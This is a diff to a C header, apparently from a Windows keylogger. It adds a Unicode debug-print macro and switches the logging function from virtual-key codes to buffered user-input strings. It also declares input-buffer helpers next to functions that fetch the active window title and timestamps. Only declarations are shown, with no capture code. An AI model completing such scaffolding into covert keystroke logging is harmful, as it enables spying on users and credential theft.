@@ -31,13 +31,33 @@ do {                                                       \
     OutputDebugStringA(_buf);                              \
 } while (0)
 
+
+// unciode
+#define DBG_unicode(fmt, ...)                                      \
+do {                                                       \
+    wchar_t _wbuf[512];                                    \
+    _snwprintf_s(                                         \
+        _wbuf,                                            \
+        sizeof(_wbuf)/sizeof(_wbuf[0]),                  \
+        _TRUNCATE,                                       \
+        fmt,                                             \
+        ##__VA_ARGS__);                                  \
+    OutputDebugStringW(_wbuf);                            \
+} while (0)
+
 // logs_utils.c
 char    *GetMyLocalTime(void);
 char    *GetActiveWindowTitle(void);
 char    *FormatLogTime(void);
 
 // logs.c
-void    WriteLogs(DWORD vkCode);
+void    WriteLogs(char *userInput);
 
+// input.c
+char    *input_get_buffer(void);
+void    input_add_key(char c);
+char    *input_buffer(void);
+void    input_clean_buffer(void);
+void    input_add_string(char *str);
 
 #endif
